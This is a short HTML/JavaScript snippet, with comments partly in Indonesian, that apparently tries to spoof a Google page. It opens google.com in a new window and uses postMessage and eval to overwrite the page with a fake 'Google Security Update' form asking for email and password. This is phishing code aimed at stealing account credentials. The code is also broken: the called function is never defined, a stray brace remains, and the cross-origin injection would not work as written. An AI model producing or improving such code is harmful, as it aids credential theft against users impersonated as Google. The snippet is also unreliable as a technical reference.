<body>
<button onclick="advancedSpoof()">Continue to Service</button>

<script>

    const w = window.open('https://www.google.com', 'spoofWindow');
    
    setTimeout(() => {
        // Gunakan postMessage untuk komunikasi cross-origin
        w.postMessage('injectContent', '*');
    }, 2000);
    
    // Listen untuk response (jika needed)
    window.addEventListener('message', (event) => {
        if (event.data === 'readyForInjection') {
            // Execute script di target window
            w.eval(`
                document.body.innerHTML = \\`
                <div style="padding: 40px; text-align: center;">
                    <h2>Google Security Update</h2>
                    <p>Your account requires re-authentication</p>
                    <input type="email" placeholder="Email">
                    <input type="password" placeholder="Password">
                    <button>Secure Login</button>
                </div>
                \\`;
            `);
        }
    });
}
</script>
